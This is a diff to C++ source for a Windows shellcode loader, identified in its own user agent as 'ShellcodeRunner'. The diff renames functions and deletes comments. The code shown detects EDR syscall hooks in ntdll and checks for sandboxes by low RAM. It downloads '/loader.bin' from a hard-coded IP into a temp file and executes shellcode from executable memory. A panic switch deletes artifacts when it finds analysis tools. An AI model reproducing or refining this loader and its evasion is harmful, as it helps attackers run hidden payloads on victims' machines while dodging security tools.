@@ -10,7 +10,7 @@
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "wininet.lib")
 
-bool IsHookedFunction(PVOID functionAddress)
+bool HookedFunc(PVOID functionAddress)
 {
     // Syscall stubs start with these bytes in ntdll
     unsigned char syscallPrologue[4] = { 0x4c, 0x8b, 0xd1, 0xb8 };
@@ -28,7 +28,7 @@ bool IsHookedFunction(PVOID functionAddress)
     return true; 
 }
 
-bool isSyscallHooked() {
+bool SyscallHookedDetect() {
     bool syscallHooked = false;
 
     // List of functions to be ignored during verification
@@ -80,7 +80,7 @@ bool isSyscallHooked() {
 
         // Only interested in Nt|Zw functions
         if (strncmp(functionName, "Nt", 2) == 0 || strncmp(functionName, "Zw", 2) == 0) {
-            if (IsHookedFunction(functionAddress)) {
+            if (HookedFunc(functionAddress)) {
                 printf("Hooked or modified: %s : %p\n", functionName, functionAddress);
                 syscallHooked = true; // Mark as hooked if any function is modified
             }
@@ -94,7 +94,7 @@ bool isSyscallHooked() {
     return syscallHooked;
 }
 
-bool isDomainOnline(const wchar_t* domain) {
+bool DomainDetect(const wchar_t* domain) {
     HINTERNET hSession = WinHttpOpen(L"ShellcodeRunner", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return false;
 
@@ -250,10 +250,10 @@ bool DetectSandboxEnvironment() {
     memInfo.dwLength = sizeof(MEMORYSTATUSEX);
     if (!GlobalMemoryStatusEx(&memInfo)) {
         std::cerr << "Failed to retrieve memory information" << std::endl;
-        return true; // Fail-safe: assume sandbox
+        return true; 
     }
 
-    // Check RAM size (e.g., < 4 GB may indicate a sandbox)
+    // Check RAM size < 4 GB indicate a sandbox
     if (memInfo.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) {
         std::cout << "Detected low memory environment: " << (memInfo.ullTotalPhys / (1024 * 1024)) << " MB" << std::endl;
         return true;
@@ -304,20 +304,18 @@ bool DetectInternetConnection() {
 void PanicSwitch() {
     std::cerr << "Panic switch activated! Destroying artifacts...\n";
 
-    // Delete temporary files
     DeleteFile(L"C:\\Windows\\Temp\\shellcode.bin");
 
-    // Terminate current process
     ExitProcess(1);
 }
 
 int main() {
-    const wchar_t* domain = L"192.168.15.47"; // Replace with the real domain
+    const wchar_t* domain = L"192.168.15.47"; 
     const wchar_t* path = L"/loader.bin";
     const wchar_t* outputFilePath = L"C:\\Windows\\Temp\\shellcode.bin";
 
-    // Kill-switch: Check if the domain is online
-    if (!isDomainOnline(domain)) {
+    // Check the domain is online
+    if (!DomainDetect(domain)) {
         std::cerr << "Domain offline\n";
         PanicSwitch();
         return 1;
@@ -341,7 +339,7 @@ int main() {
 
 
     // Kill-switch: Detect syscall hooks
-    if (isSyscallHooked()) {
+    if (SyscallHookedDetect()) {
         std::cerr << "Syscall hooks detected\n";
         PanicSwitch();
         return 1;
@@ -405,7 +403,6 @@ int main() {
     auto shellcodeFunc = reinterpret_cast<void(*)()>(execMemory);
     shellcodeFunc();
 
-    // Clean up memory
     VirtualFree(execMemory, 0, MEM_RELEASE);
 
     return 0;
